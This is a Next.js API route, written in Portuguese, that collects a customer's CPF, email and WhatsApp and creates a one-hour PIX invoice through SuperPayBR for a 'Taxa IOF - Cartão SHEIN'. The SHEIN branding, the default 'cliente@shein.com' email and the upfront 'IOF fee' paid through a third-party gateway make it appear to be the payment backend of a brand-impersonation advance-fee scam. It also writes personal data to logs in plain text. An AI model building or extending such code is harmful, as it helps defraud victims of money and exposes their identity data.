import { type NextRequest, NextResponse } from "next/server"

export async function POST(request: NextRequest) {
  try {
    console.log("=== CRIANDO FATURA IOF SUPERPAYBR ===")

    const body = await request.json()
    const { amount = 10.0 } = body // Taxa IOF padrão

    // Obter dados dos headers
    const cpfData = JSON.parse(request.headers.get("x-cpf-data") || "{}")
    const userEmail = request.headers.get("x-user-email") || ""
    const userWhatsApp = request.headers.get("x-user-whatsapp") || ""

    console.log("📋 Dados para fatura IOF SuperPayBR:", {
      amount,
      customer: {
        nome: cpfData.nome,
        email: userEmail,
        whatsapp: userWhatsApp,
      },
    })

    // Primeiro, fazer autenticação
    const authResponse = await fetch(`${request.nextUrl.origin}/api/superpaybr/auth`, {
      method: "POST",
    })
    const authResult = await authResponse.json()

    if (!authResult.success) {
      throw new Error(`Falha na autenticação SuperPayBR: ${authResult.error}`)
    }

    const accessToken = authResult.data.access_token

    // Preparar dados da fatura IOF
    const totalAmount = Math.round(amount * 100) // SuperPayBR usa centavos
    const externalId = `SHEIN_IOF_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`

    const invoiceData = {
      external_id: externalId,
      amount: totalAmount,
      description: "Taxa IOF - Cartão SHEIN",
      customer: {
        name: cpfData.nome || "Cliente SHEIN",
        email: userEmail || "cliente@shein.com",
        phone: userWhatsApp || "",
        document: cpfData.cpf || "",
      },
      payment_method: "PIX",
      due_date: new Date(Date.now() + 60 * 60 * 1000).toISOString(), // 1 hora
      webhook_url: `${request.nextUrl.origin}/api/superpaybr/webhook`,
      metadata: {
        type: "iof",
        product: "SHEIN Card IOF",
        customer_name: cpfData.nome,
      },
    }

    console.log("📤 Enviando dados IOF para SuperPayBR:", invoiceData)

    // Criar fatura na SuperPayBR
    const apiUrl = process.env.SUPERPAYBR_API_URL || "https://api.superpaybr.com"
    const createResponse = await fetch(`${apiUrl}/invoices`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Authorization: `Bearer ${accessToken}`,
        Accept: "application/json",
      },
      body: JSON.stringify(invoiceData),
    })

    console.log("📥 Resposta da criação IOF SuperPayBR:", {
      status: createResponse.status,
      statusText: createResponse.statusText,
      ok: createResponse.ok,
    })

    if (createResponse.ok) {
      const invoiceResult = await createResponse.json()
      console.log("✅ Fatura IOF SuperPayBR criada com sucesso!")

      // Mapear resposta para formato esperado
      const mappedInvoice = {
        id: invoiceResult.id || externalId,
        invoice_id: invoiceResult.invoice_id || invoiceResult.id,
        external_id: externalId,
        pix: {
          payload: invoiceResult.payment?.details?.pix_code || invoiceResult.pix_code || "",
          image: invoiceResult.payment?.details?.qrcode || "",
          qr_code:
            invoiceResult.payment?.details?.qrcode ||
            `https://quickchart.io/qr?text=${encodeURIComponent(invoiceResult.payment?.details?.pix_code || invoiceResult.pix_code || "")}`,
        },
        status: {
          code: invoiceResult.status?.code || 1,
          title: invoiceResult.status?.title || "Aguardando Pagamento",
          text: "pending",
        },
        valores: {
          bruto: totalAmount,
          liquido: totalAmount,
        },
        vencimento: {
          dia: new Date(Date.now() + 60 * 60 * 1000).toISOString().split("T")[0],
        },
        type: "iof",
      }

      return NextResponse.json({
        success: true,
        data: mappedInvoice,
        message: "Fatura IOF SuperPayBR criada com sucesso",
        raw_response: invoiceResult,
      })
    } else {
      const errorText = await createResponse.text()
      console.log("❌ Erro ao criar fatura IOF SuperPayBR:", createResponse.status, errorText)

      // Tentar parsear erro como JSON
      let errorData = null
      try {
        errorData = JSON.parse(errorText)
      } catch {
        errorData = { message: errorText }
      }

      throw new Error(`Erro SuperPayBR ${createResponse.status}: ${errorData.message || errorText}`)
    }
  } catch (error) {
    console.log("❌ Erro ao criar fatura IOF SuperPayBR:", error)

    return NextResponse.json(
      {
        success: false,
        error: error instanceof Error ? error.message : "Erro desconhecido ao criar fatura IOF SuperPayBR",
        should_create_emergency: true,
      },
      { status: 500 },
    )
  }
}

export async function GET(request: NextRequest) {
  return NextResponse.json({
    success: true,
    message: "SuperPayBR Create IOF Invoice endpoint ativo",
    timestamp: new Date().toISOString(),
  })
}
